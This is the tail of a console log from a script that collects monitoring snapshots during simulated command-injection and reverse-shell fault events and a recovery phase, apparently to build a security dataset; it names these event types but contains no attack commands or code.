+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30Collected snapshot 31Collected snapshot 32Collected snapshot 33Collected snapshot 34Collected snapshot 35Collected snapshot 36Collected snapshot 37Collected snapshot 38Collected snapshot 39Collected snapshot 40Collected snapshot 41Collected snapshot 42Collected snapshot 43Collected snapshot 44Collected snapshot 45Collected snapshot 46Collected snapshot 47Collected snapshot 48Collected snapshot 49Collected snapshot 50Collected snapshot 51Collected snapshot 52Collected snapshot 53Collected snapshot 54Collected snapshot 55Collected snapshot 56Collected snapshot 57Collected snapshot 58Collected snapshot 59Collected snapshot 60Collected snapshot 61Collected snapshot 62Collected snapshot 63Collected snapshot 64Collected snapshot 65Collected snapshot 66Collected snapshot 67Collected snapshot 68Collected snapshot 69Collected snapshot 70Collected snapshot 71Collected snapshot 72Collected snapshot 73Collected snapshot 74Collected snapshot 75Collected snapshot 76Collected snapshot 77Collected snapshot 78Collected snapshot 79Collected snapshot 80Collected snapshot 81Collected snapshot 82Collected snapshot 83Collected snapshot 84Collected snapshot 85Collected snapshot 86Collected snapshot 87Collected snapshot 88Collected snapshot 89Collected snapshot 90
+Completed collection with 90 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/dropout/command_injection_dropout_shell_20250421_163348.jsonl
+Reverse shell data collected: datasets/master_20250421/command_injection/dropout/command_injection_dropout_shell_20250421_163348.jsonl
+Collecting post-event recovery data...
+Starting data collection for event: command_injection_dropout_recovery
+Duration: 60 seconds, Interval: 2 seconds
+Collected snapshot 1Collected snapshot 2Collected snapshot 3Collected snapshot 4Collected snapshot 5Collected snapshot 6Collected snapshot 7Collected snapshot 8Collected snapshot 9Collected snapshot 10Collected snapshot 11Collected snapshot 12Collected snapshot 13Collected snapshot 14Collected snapshot 15Collected snapshot 16Collected snapshot 17Collected snapshot 18Collected snapshot 19Collected snapshot 20Collected snapshot 21Collected snapshot 22Collected snapshot 23Collected snapshot 24Collected snapshot 25Collected snapshot 26Collected snapshot 27Collected snapshot 28Collected snapshot 29Collected snapshot 30
+Completed collection with 30 snapshots.
+Dataset saved to: datasets/master_20250421/command_injection/dropout/command_injection_dropout_recovery_20250421_163648.jsonl
+Recovery data collected: datasets/master_20250421/command_injection/dropout/command_injection_dropout_recovery_20250421_163648.jsonl
+Setting fault mode to: none on localhost:12384
+Fault mode set response: {
+  "fault_mode": "none", 
+  "status": "success"
+}
+Cooling down for 60 seconds...
+=====================================================
+Command injection dataset collection complete!
+=====================================================
+Master metadata file: datasets/master_20250421/command_injection/command_injection_dataset_master_20250421_155736.json
+
+To process this data into CSV format, run:
+python3 command_injection_processor_refactored.py --metadata datasets/master_20250421/command_injection/command_injection_dataset_master_20250421_155736.json
